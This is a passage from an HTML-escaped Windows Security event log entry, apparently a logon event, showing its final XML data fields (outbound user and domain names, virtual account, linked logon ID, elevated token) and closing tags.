      &lt;Data Name=&quot;TargetOutboundUserName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetOutboundDomainName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;VirtualAccount&quot;&gt;%%1843&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetLinkedLogonId&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;ElevatedToken&quot;&gt;%%1842&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;